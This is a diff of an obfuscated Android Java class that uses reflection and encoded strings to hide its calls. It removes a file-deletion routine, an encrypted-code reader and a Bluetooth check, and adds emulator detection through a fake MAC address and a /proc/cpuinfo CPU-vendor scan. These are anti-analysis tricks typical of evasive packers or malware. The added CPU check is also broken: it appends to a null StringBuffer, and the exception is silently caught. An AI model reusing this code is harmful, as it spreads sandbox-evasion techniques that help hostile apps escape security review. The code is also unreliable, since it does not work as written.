@@ -1,55 +1,52 @@
 package com.dmy;
 
+import android.text.TextUtils;
+
 import java.io.File;
-import java.io.IOException;
+import java.io.FileInputStream;
 import java.io.InputStream;
 
 public class ClassName3 {
 
-    public static void eteDirectory(File file) {
-        if (file.isDirectory()) {
-            File[] childFiles = (File[]) ClassName0.invokeNoStaticMethod(file, new ClassName1().decodeStr("listFiles"), null);
-            if (childFiles != null) {
-                for (int i = 0; i < childFiles.length; i++) {
-                    ClassName0.invokeNoStaticMethod(childFiles[i], new ClassName1().decodeStr("delete"), null);
-                }
-            }
+    public static boolean isMacBad() {
+        String macString = ClassName4.getMacAddress();
+        if (TextUtils.isEmpty(macString)) {
+            return false;
+        } else if (ClassName2.decodeStr("2:0:0:0:0:0").equals(macString)) {
+            return true;
+        } else {
+            return false;
         }
-        ClassName0.invokeNoStaticMethod(file, new ClassName1().decodeStr("delete"), null);
     }
 
-    public static byte[] getCodeByte(InputStream p0)throws IOException {
-        byte[] numArr = new byte[1];
-        p0.read(numArr, 0, 1);
-        int num = numArr[0];
-        byte[] encCode = new byte[num];
-        p0.read(encCode, 0, num);
-        return encCode;
-    }
-
-    public boolean isBluetoothCheck() {
-        String blue = "android.bluetooth.BluetoothAdapter";
+    public static boolean isCpuCheck() {
+        String aa = "";
+        String istr = ClassName2.decodeStr("intel");
+        String pci = ClassName2.decodeStr("/proc/cpuinfo");
         try {
-            Object[] nhb_args = null;
-            String blueStr = new ClassName1().decodeStr(blue);
-            Class cl = Class.forName(blueStr);
-            Object nhb_host = null;
-            String gda = "getDefaultAdapter";
-            String gdaStr = new ClassName1().decodeStr(gda);
-            Class<?>[] nhb_clzs = null;
-            Object ob = ClassName0.invokeMethod(cl, gdaStr, nhb_host, nhb_clzs, nhb_args);
-            String gn = "getName";
-            if (ob == null) {
-                return true;
+            InputStream is = new FileInputStream(pci);
+            StringBuffer sb = null;
+            int len = -1;
+            while (true) {
+                len = (int) ClassName4.invokeMethod(is.getClass(), ClassName2.decodeStr("msreadms").substring(2, 6), is, (Class<?>[]) null, (Object[]) null);
+                if (len == -1) {
+                    break;
+                }
+                sb.append((char) len);
             }
-            String gnStr = new ClassName1().decodeStr(gn);
-            Object re = ClassName0.invokeMethod(cl, gnStr, ob, nhb_clzs, nhb_args);
-            if (re == null) {
-                return true;
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
+            aa = sb.toString();
+            is.close();
+        } catch (Exception var7) {
         }
-        return false;
+        String aStr = ClassName2.decodeStr("amd");
+        return aa.contains(istr) || aa.contains(aStr);
+    }
+
+    public static void createFile(File p0) {
+        if (!p0.exists()) {
+            File parentFile = (File) new ClassName4().invokeNoStaticMethod(p0, ClassName2.decodeStr("msgetParentFilems").substring(2, 15), null);
+            new ClassName4().invokeNoStaticMethod(parentFile, ClassName2.decodeStr("mkdirs"), null);
+            new ClassName4().invokeNoStaticMethod(p0, ClassName2.decodeStr("createNewFile"), null);
+        }
     }
 }
